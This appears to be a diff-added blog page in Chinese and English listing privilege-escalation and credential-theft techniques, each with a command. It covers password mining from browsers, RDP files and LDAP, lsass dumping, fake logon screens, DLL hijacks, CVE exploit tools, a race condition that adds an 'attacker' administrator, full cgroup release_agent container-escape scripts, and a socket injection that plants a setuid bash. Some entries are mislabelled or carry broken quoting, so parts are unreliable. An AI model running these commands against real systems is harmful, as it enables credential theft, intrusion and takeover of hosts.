+<h3 id="Password-Mining-in-PuttyH操作系统tKeys"><a href="#Password-Mining-in-PuttyH操作系统tKeys" class="headerlink" title="Password Mining in PuttyH操作系统tKeys"></a>Password Mining in PuttyH操作系统tKeys</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe PuttyHostKeys</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-RDCManFiles"><a href="#Password-Mining-in-RDCManFiles" class="headerlink" title="Password Mining in RDCManFiles"></a>Password Mining in RDCManFiles</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe RDCManFiles</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-RDPSavedConnections"><a href="#Password-Mining-in-RDPSavedConnections" class="headerlink" title="Password Mining in RDPSavedConnections"></a>Password Mining in RDPSavedConnections</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe RDPSavedConnections</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-MasterKeys"><a href="#Password-Mining-in-MasterKeys" class="headerlink" title="Password Mining in MasterKeys"></a>Password Mining in MasterKeys</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDPAPI masterkeys</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p>
+<h3 id="Password-Mining-in-Browsers"><a href="#Password-Mining-in-Browsers" class="headerlink" title="Password Mining in Browsers"></a>Password Mining in Browsers</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpWeb.exe all</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2">https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2</a></p>
+<h3 id="Password-Mining-in-Files"><a href="#Password-Mining-in-Files" class="headerlink" title="Password Mining in Files"></a>Password Mining in Files</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SauronEye.exe -d C:\Users\vincent\Desktop\ –filetypes .txt .doc .docx .xls –contents –keywords password pass* -v</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/vivami/SauronEye/releases/tag/v0.0.9">https://github.com/vivami/SauronEye/releases/tag/v0.0.9</a></p>
+<h3 id="Password-Mining-in-LDAP"><a href="#Password-Mining-in-LDAP" class="headerlink" title="Password Mining in LDAP"></a>Password Mining in LDAP</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpLDAPSearch.exe &quot;(&amp;(objectClass=user)(cn=*svc*))&quot; &quot;sam用户名&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：</p>
+<p>sharpldapsearch：<a target="_blank" rel="noopener" href="https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2">https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2</a></p>
+<p>powerview：好多个版本，应该是这个吧？<a target="_blank" rel="noopener" href="https://github.com/ericshoemaker/PowerView">https://github.com/ericshoemaker/PowerView</a></p>
+<h3 id="Password-Mining-in-Clipboard"><a href="#Password-Mining-in-Clipboard" class="headerlink" title="Password Mining in Clipboard"></a>Password Mining in Clipboard</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly /root/SharpClipHistory.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0">https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0</a></p>
+<h3 id="Password-Mining-in-GMSA-Password"><a href="#Password-Mining-in-GMSA-Password" class="headerlink" title="Password Mining in GMSA Password"></a>Password Mining in GMSA Password</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GMSAPasswordReader.exe –accountname SVC_SERVICE_ACCOUNT</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p>
+<h3 id="Delegate-tokens-via-RDP"><a href="#Delegate-tokens-via-RDP" class="headerlink" title="Delegate tokens via RDP"></a>Delegate tokens via RDP</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows/Linux</p>
+<p>类型:  Delegate tokens</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fake_rdp.py</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：</p>
+<p>fake_rdp：<a target="_blank" rel="noopener" href="https://github.com/cheeseandcereal/fake-rdp">https://github.com/cheeseandcereal/fake-rdp</a></p>
+<p>pyrdp-mitm未找到QAQ</p>
+<h3 id="Delegate-tokens-via-FTP"><a href="#Delegate-tokens-via-FTP" class="headerlink" title="Delegate tokens via FTP"></a>Delegate tokens via FTP</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows/Linux</p>
+<p>类型:  Delegate tokens</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FakeFtpServer fakeFtpServer = new FakeFtpServer();</span><br><span class="line"></span><br><span class="line">fakeFtpServer.addUserAccount(new UserAccount(“user”, “password”, “c:\\data”));</span><br><span class="line"></span><br><span class="line">FileSystem fileSystem = new WindowsFakeFileSystem();</span><br><span class="line"></span><br><span class="line">fileSystem.add(new DirectoryEntry(“c:\\data”));</span><br><span class="line"></span><br><span class="line">fileSystem.add(new FileEntry(“c:\\data\\file1.txt”, “abcdef 1234567890”));</span><br><span class="line"></span><br><span class="line">fileSystem.add(new FileEntry(“c:\\data\\run.exe”));</span><br><span class="line"></span><br><span class="line">fakeFtpServer.setFileSystem(fileSystem);  </span><br><span class="line"></span><br><span class="line">fakeFtpServer.start();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fake-Logon-Screen"><a href="#Fake-Logon-Screen" class="headerlink" title="Fake Logon Screen"></a>Fake Logon Screen</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Delegate tokens</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly fakelogonscreen.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1">https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1</a></p>
+<h3 id="Abusing-WinRM-Services"><a href="#Abusing-WinRM-Services" class="headerlink" title="Abusing WinRM Services"></a>Abusing WinRM Services</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Service</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RogueWinRM.exe -p C:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1">https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1</a></p>
+<h3 id="Dump-lsass-with-SilentProcessExit"><a href="#Dump-lsass-with-SilentProcessExit" class="headerlink" title="Dump lsass with SilentProcessExit"></a>Dump lsass with SilentProcessExit</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法:</p>
+<ol>
+<li><code>SilentProcessExit.exe pid</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/deepinstinct/LsassSilentProcessExit">https://github.com/deepinstinct/LsassSilentProcessExit</a></p>
+<h3 id="Lsass-Shtinkering"><a href="#Lsass-Shtinkering" class="headerlink" title="Lsass Shtinkering"></a>Lsass Shtinkering</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法:</p>
+<ol>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</code></li>
+<li><code>LSASS_Shtinkering.exe pid</code></li>
+</ol>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></p>
+<h3 id="AndrewSpecial"><a href="#AndrewSpecial" class="headerlink" title="AndrewSpecial"></a>AndrewSpecial</h3><p>域: No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法：</p>
+<ul>
+<li><code>AndrewSpecial.exe</code></li>
+</ul>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/hoangprod/AndrewSpecial">https://github.com/hoangprod/AndrewSpecial</a></p>
+<h3 id="CCACHE-ticket-reuse-from-tmp"><a href="#CCACHE-ticket-reuse-from-tmp" class="headerlink" title="CCACHE ticket reuse from /tmp"></a>CCACHE ticket reuse from /tmp</h3><p>域: Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法:</p>
+<ul>
+<li><code>ls /tmp/ | grep krb5cc_X</code></li>
+<li><code>export KRB5CCNAME=/tmp/krb5cc_X</code></li>
+</ul>
+<h3 id="CCACHE-ticket-reuse-from-keyring"><a href="#CCACHE-ticket-reuse-from-keyring" class="headerlink" title="CCACHE ticket reuse from keyring"></a>CCACHE ticket reuse from keyring</h3><p>域: Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法:</p>
+<ul>
+<li><code>https://github.com/TarlogicSecurity/tickey</code></li>
+<li><code>/tmp/tickey -i</code></li>
+</ul>
+<h3 id="CCACHE-ticket-reuse-from-SSSD-KCM"><a href="#CCACHE-ticket-reuse-from-SSSD-KCM" class="headerlink" title="CCACHE ticket reuse from SSSD KCM"></a>CCACHE ticket reuse from SSSD KCM</h3><p>域: Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Enumeration &amp; Hunting</p>
+<p>方法：</p>
+<ul>
+<li><code>git clone https://github.com/fireeye/SSSDKCMExtractor</code></li>
+<li><code>python3 SSSDKCMExtractor.py –database secrets.ldb –key secrets.mkey</code></li>
+</ul>
+<h3 id="CCACHE-ticket-reuse-from-keytab"><a href="#CCACHE-ticket-reuse-from-keytab" class="headerlink" title="CCACHE ticket reuse from keytab"></a>CCACHE ticket reuse from keytab</h3><p>域: Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux/Windows/Mac</p>
+<p>类型：Enumeration &amp; Hunting</p>
+<p>方法：</p>
+<ul>
+<li><code>git clone https://github.com/its-a-feature/KeytabParser</code></li>
+<li><code>python KeytabParser.py /etc/krb5.keytab</code></li>
+<li><code>klist -k /etc/krb5.keytab</code></li>
+</ul>
+<p>Or</p>
+<ul>
+<li><code>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</code></li>
+<li><code>python3 keytabextract.py krb5.keytab</code></li>
+<li><code>./bifrost -action dump -source keytab -path test</code></li>
+</ul>
+<h3 id="SSH-Forwarder"><a href="#SSH-Forwarder" class="headerlink" title="SSH Forwarder"></a>SSH Forwarder</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Enumeration &amp; Hunting</p>
+<p>方法：</p>
+<ul>
+<li>转发代理 yes<code>ForwardAgent yes</code></li>
+<li><code>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</code></li>
+</ul>
+<p>AppleScript</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Enumeration &amp; Hunt</p>
+<p>方法：</p>
+<ul>
+<li>(EmPyre) &gt; <code>listeners</code></li>
+<li>(EmPyre: listeners) &gt; <code>set Name mylistener</code></li>
+<li>(EmPyre: listeners) &gt; <code>execute</code></li>
+<li>(EmPyre: listeners) &gt; <code>usestager applescript mylistener</code></li>
+<li>(EmPyre: stager/applescript) &gt; <code>execute</code></li>
+</ul>
+<p>批注：这个工具我找了半天，发现这是个七八年前的一个工具</p>
+<p>链接地址<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/EmPyre">https://github.com/EmpireProject/EmPyre</a></p>
+<h3 id="DLL-Search-Order-Hijacking"><a href="#DLL-Search-Order-Hijacking" class="headerlink" title="DLL Search Order Hijacking"></a>DLL Search Order Hijacking</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Hijack</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</code></li>
+<li>运行<code>Brownie</code></li>
+</ul>
+<h3 id="Slui-File-Handler-Hijack-LPE"><a href="#Slui-File-Handler-Hijack-LPE" class="headerlink" title="Slui File Handler Hijack LPE"></a>Slui File Handler Hijack LPE</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Hijack</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</code></li>
+<li><code>Slui.exe</code></li>
+</ul>
+<h3 id="CDPSvc-DLL-Hijacking"><a href="#CDPSvc-DLL-Hijacking" class="headerlink" title="CDPSvc DLL Hijacking"></a>CDPSvc DLL Hijacking</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Hijack</p>
+<p>方法：</p>
+<ul>
+<li><code>Cdpsgshims.exe</code></li>
+</ul>
+<h3 id="Magnify-exe-Dll-Search-Order-Hijacking"><a href="#Magnify-exe-Dll-Search-Order-Hijacking" class="headerlink" title="Magnify.exe Dll Search Order Hijacking"></a>Magnify.exe Dll Search Order Hijacking</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Hijack</p>
+<p>方法：</p>
+<ul>
+<li><code>将有效负载 dll 作为 igdgmm64.dll 复制到可写的系统路径 %PATH%，例如 C:\python27</code></li>
+<li>按Win键+L</li>
+<li>按回车键</li>
+<li><code>在显示密码框的登录屏幕上按 WinKey++(plusKey).</code></li>
+<li><code>然后payload dll将以系统访问权限执行.</code></li>
+</ul>
+<h3 id="CdpSvc-Service"><a href="#CdpSvc-Service" class="headerlink" title="CdpSvc Service"></a>CdpSvc Service</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Hijack</p>
+<p>方法：</p>
+<ul>
+<li><code>使用 acltest.ps1 查找可写系统路径（例如 C:\python27）</code></li>
+<li><code>C:\CdpSvcLPE&gt; powershell -ep bypass “..\acltest.ps1”</code></li>
+<li>将 <code>cdpsgshims.dll</code>复制到 <code>C:\python27</code></li>
+<li>创建 <code>C:\temp</code> 文件夹并将 <code>impersonate.bin</code> 复制到 <code>C:\temp</code></li>
+<li><code>C:\CdpSvcLPE&gt; mkdir C:\temp</code></li>
+<li><code>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</code></li>
+<li>重新启动（或以管理员身份停止/启动 CDPSvc）</li>
+<li><code>cmd 将提示 nt authority\system。</code></li>
+</ul>
+<h3 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>HiveNightmare.exe 200</code></li>
+</ul>
+<p>CVE-2021-30655</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/thehappydinoa/rootOS</code></li>
+<li><code>Python rootOS.py</code></li>
+</ul>
+<p>CVE-2019-8526</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Mac</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/amanszpapaya/MacPer</code></li>
+<li><code>Python main.py</code></li>
+</ul>
+<p>CVE-2020-9771</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Mac</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/amanszpapaya/MacPer</code></li>
+<li><code>Python main.py</code></li>
+</ul>
+<p>CVE-2021-3156</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Mac</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/amanszpapaya/MacPer</code></li>
+<li><code>Python main.py</code></li>
+</ul>
+<p>CVE-2018-4280</p>
+<p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Mac</p>
+<p>类型： 0/1 Exploit</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/bazad/launchd-portrep</code></li>
+<li><code>./launchd-portrep ‘touch /tmp/exploit-success’=</code></li>
+</ul>
+<h3 id="Abusing-with-FileRestorePrivilege"><a href="#Abusing-with-FileRestorePrivilege" class="headerlink" title="Abusing with FileRestorePrivilege"></a>Abusing with FileRestorePrivilege</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Abuse Privilege</p>
+<p>方法：</p>
+<ul>
+<li><code>poptoke.exe</code></li>
+</ul>
+<h3 id="Abusing-with-RestoreAndBackupPrivileges"><a href="#Abusing-with-RestoreAndBackupPrivileges" class="headerlink" title="Abusing with RestoreAndBackupPrivileges"></a>Abusing with RestoreAndBackupPrivileges</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Abuse Privilege</p>
+<p>方法：</p>
+<ul>
+<li><code>poptoke.exe</code></li>
+</ul>
+<h3 id="Abusing-with-ShadowCopyBackupPrivilege"><a href="#Abusing-with-ShadowCopyBackupPrivilege" class="headerlink" title="Abusing with ShadowCopyBackupPrivilege"></a>Abusing with ShadowCopyBackupPrivilege</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Abuse Privilege</p>
+<p>方法：</p>
+<ul>
+<li><code>poptoke.exe</code></li>
+</ul>
+<h3 id="Abusing-with-ShadowCopy"><a href="#Abusing-with-ShadowCopy" class="headerlink" title="Abusing with ShadowCopy"></a>Abusing with ShadowCopy</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Abuse Privilege</p>
+<p>方法：</p>
+<ul>
+<li><code>poptoke.exe</code></li>
+</ul>
+<p>批注：我找了很多，感觉最像是的应该是这个工具</p>
+<p>链接<a target="_blank" rel="noopener" href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></p>
+<h3 id="Dynamic-Phishing"><a href="#Dynamic-Phishing" class="headerlink" title="Dynamic Phishing"></a>Dynamic Phishing</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Mac</p>
+<p>类型：Phish</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/thehappydinoa/rootOS</code></li>
+<li><code>Python rootOS.py</code></li>
+</ul>
+<h3 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Race Condition</p>
+<p>方法：</p>
+<ul>
+<li><code>echo “net localgroup administrators attacker /add” &gt; C:\temp\not-evil.bat</code></li>
+<li><code>tempracer.exe C:\ temp\*.bat</code></li>
+</ul>
+<h3 id="Abusing-usermode-helper-API"><a href="#Abusing-usermode-helper-API" class="headerlink" title="Abusing usermode helper API"></a>Abusing usermode helper API</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Abusing Capabilities</p>
+<p>方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</span><br><span class="line">mkdir -p $d/w; echo 1 &gt; $d/w/notify_on_release</span><br><span class="line">t=`sed -n ‘s/.*\perdir=\([^,]*\).*/\1/p’ /etc/mtab`</span><br><span class="line">touch /o; echo $t/c &gt; $d/release_agent</span><br><span class="line">echo “#!/bin/sh” &gt; /c</span><br><span class="line">echo “ps &gt; $t/o” &gt;&gt; /c</span><br><span class="line">chmod +x /c</span><br><span class="line">sh -c “echo 0 &gt; $d/w/cgroup.procs”; sleep 1</span><br><span class="line">cat /o</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escape-only-with-CAP-SYS-ADMIN-capability"><a href="#Escape-only-with-CAP-SYS-ADMIN-capability" class="headerlink" title="Escape only with CAP_SYS_ADMIN capability"></a>Escape only with CAP_SYS_ADMIN capability</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Abusing Capabilities</p>
+<p>方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line">echo 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n ‘s/.*\perdir=\([^,]*\).*/\1/p’ /etc/mtab`</span><br><span class="line">echo “$host_path/cmd” &gt; /tmp/cgrp/release_agent</span><br><span class="line">echo “#!/bin/sh” &gt; /cmd</span><br><span class="line">echo “ps aux &gt; $host_path/output” &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line">sh -c “echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs”</span><br><span class="line">cat /output</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Abusing-exposed-host-directories"><a href="#Abusing-exposed-host-directories" class="headerlink" title="Abusing exposed host directories"></a>Abusing exposed host directories</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Abusing Capabilities</p>
+<p>方法：</p>
+<ul>
+<li><code>mknod /dev/sdb1 block 8 17</code></li>
+<li><code>mkdir /mnt/host_home</code></li>
+<li><code>mount /dev/sdb1 /mnt/host_home</code></li>
+<li><code>echo ‘echo “Hello from container land!” 2&gt;&amp;1’ &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</code></li>
+</ul>
+<h3 id="Unix-Wildcard"><a href="#Unix-Wildcard" class="headerlink" title="Unix Wildcard"></a>Unix Wildcard</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Injection</p>
+<p>方法：</p>
+<ul>
+<li><code>python wildpwn.py –file /tmp/very_secret_file combined ./pwn_me/</code></li>
+</ul>
+<h3 id="Socket-Command-Injection"><a href="#Socket-Command-Injection" class="headerlink" title="Socket Command Injection"></a>Socket Command Injection</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Injection</p>
+<p>方法：</p>
+<ul>
+<li><code>echo “cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;” | socat – UNIX-CLIENT:/tmp/socket_test.s</code></li>
+</ul>
+<h3 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Injection</p>
+<p>方法：</p>
+<ul>
+<li><p><code>/etc/logstash/logstash.yml</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">exec &#123;</span><br><span class="line"></span><br><span class="line">           command =&gt; “whoami”</span><br><span class="line"></span><br><span class="line">           interval =&gt; 120</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="UsoDllLoader"><a href="#UsoDllLoader" class="headerlink" title="UsoDllLoader"></a>UsoDllLoader</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Injection</p>
+<p>方法：</p>
+<ul>
+<li><code>UsoDllLoader.exe</code></li>
+</ul>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824">https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824</a></p>
+<h3 id="Trend-Chain-Methods-for-Privilege-Escalation"><a href="#Trend-Chain-Methods-for-Privilege-Escalation" class="headerlink" title="Trend Chain Methods for Privilege Escalation"></a>Trend Chain Methods for Privilege Escalation</h3><h3 id="Habanero-Chilli"><a href="#Habanero-Chilli" class="headerlink" title="Habanero Chilli"></a>Habanero Chilli</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Dll Side-loading</p>
+<p>方法：</p>
+<ul>
+<li><code>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</code></li>
+</ul>
+<h3 id="Padron-Chilli"><a href="#Padron-Chilli" class="headerlink" title="Padron Chilli"></a>Padron Chilli</h3><p>域：Y/N</p>
+<p>Local Admin: Yes</p>
